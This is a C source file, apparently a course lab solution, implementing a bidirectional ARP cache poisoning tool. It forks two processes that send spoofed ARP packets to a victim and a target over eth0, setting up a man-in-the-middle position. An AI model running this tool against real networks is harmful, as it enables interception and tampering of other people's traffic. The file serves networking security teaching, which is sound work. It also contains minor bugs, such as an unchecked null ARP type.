// SPDX-License-Identifier: Unlicense

#include <getopt.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#include "arp_util.h"
#include "log.h"
#include "pcap_util.h"
#include "util.h"

volatile int childpid = 0;

void
handlesigint(int signum)
{
  if(childpid > 0) {
    kill(childpid, SIGKILL);
    wait(0);
  }
  exit(0);
}

static void
print_usage(const char *prog)
{
  fprintf(stderr, "Usage: %s [OPTIONS]\n\n", prog);
  fprintf(stderr, "Options:\n");
  fprintf(stderr, "  -s, --source <mac>         Source MAC address\n");
  fprintf(stderr, "  -d, --destination <mac>    Destination MAC address"
                  " (default: 0)\n");
  fprintf(stderr, "  -v, --victim <ip>          Victim's IP address\n");
  fprintf(stderr, "  -t, --target <ip>          Target's IP address\n");
  fprintf(stderr, "  -n, --num-packets <count>  Number of packets to send"
                  " (default: -1)\n");
  fprintf(stderr, "  -a, --arp <type>           Type of packets to send"
                  " (request, reply, gratuitous)\n");
  fprintf(stderr, "  -h, --help                 Display this help message\n");
}

int
main(int argc, char **argv)
{
  pcap_t *handle;
  char *filter_expr;
  int opt;
  struct in_addr addr;

  char *source_mac = 0;
  char *victim_ip  = 0;
  char *target_ip  = 0;
  char *dst_mac    = 0;
  char *arptype    = 0;
  int num_packets  = -1;
  int type         = ARP_PKT_REQUEST;

  static struct option long_options[] = {
      {"source", required_argument, NULL, 's'},
      {"destination", required_argument, NULL, 'd'},
      {"victim", required_argument, NULL, 'v'},
      {"target", required_argument, NULL, 't'},
      {"num-packets", required_argument, NULL, 'n'},
      {"help", no_argument, NULL, 'h'},
      {NULL, 0, NULL, 0}};

  while((opt = getopt_long(argc, argv, "a:s:d:v:t:n:h", long_options, NULL)) !=
        -1) {
    switch(opt) {
    case 's':
      source_mac = optarg;
      break;
    case 'd':
      dst_mac = optarg;
      break;
    case 'v':
      victim_ip = optarg;
      break;
    case 't':
      target_ip = optarg;
      break;
    case 'n':
      num_packets = atoi(optarg);
      if(num_packets <= 0) {
        print_err("Error: Number of packets must be a positive integer.\n\n");
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
      }
      break;
    case 'a':
      arptype = optarg;
      break;
    case 'h':
      print_usage(argv[0]);
      exit(EXIT_SUCCESS);
    default:
      print_usage(argv[0]);
      exit(EXIT_FAILURE);
    }
  }

  if(!source_mac || !victim_ip || !target_ip) {
    print_err("Error: Options -s, -v, and -t are required.\n\n");
    print_usage(argv[0]);
    exit(EXIT_FAILURE);
  }

  // parse the ARP type
  if(!strncmp(arptype, "request", strlen("request"))) {
    type = ARP_PKT_REQUEST;
  } else if(!strncmp(arptype, "reply", strlen("reply"))) {
    type = ARP_PKT_REPLY;
  } else if(!strncmp(arptype, "gratuitous", strlen("gratuitous"))) {
    type = ARP_PKT_GRATUITOUS;
  } else {
    print_err("Unknow ARP packet type %s\n\n", arptype);
    print_usage(argv[0]);
    exit(EXIT_FAILURE);
  }

  // this program does not work for replies.
  if(type == ARP_PKT_REPLY) {
    print_err("Sending replies with this particular program does not work\n"
              "Please instead launch the binary from lab06 twice with the "
              "correct arguments.\n");
    exit(EXIT_FAILURE);
  }

  // build the filter expression
  filter_expr = build_filter_expr("eth0", source_mac, 0);

  // Grab the pcap device for the interface.
  handle = find_pcap_dev("eth0", &addr, filter_expr);

  // set the signal handler to kill the child
  setsighandler(SIGINT, handlesigint);

  // Grab another process to run the reverse direction.
  childpid = fork();
  if(childpid < 0) {
    perror("fork");
    exit(EXIT_FAILURE);
  }

  if(childpid == 0) {
    // TODO:
    // =====
    //   Call send_arp_packets to poison the target's cache with for the entry
    //   for the victom's IP address.
    send_arp_packets(handle, num_packets, type, source_mac, dst_mac, victim_ip, target_ip);
    exit(EXIT_SUCCESS);
  }

  // TODO:
  // =====
  //   Call send_arp_packets to poison the victim's cache with for the entry
  //   for the target's IP address.
  send_arp_packets(handle, num_packets, type, source_mac, dst_mac, target_ip, victim_ip);
  exit(EXIT_SUCCESS);
}
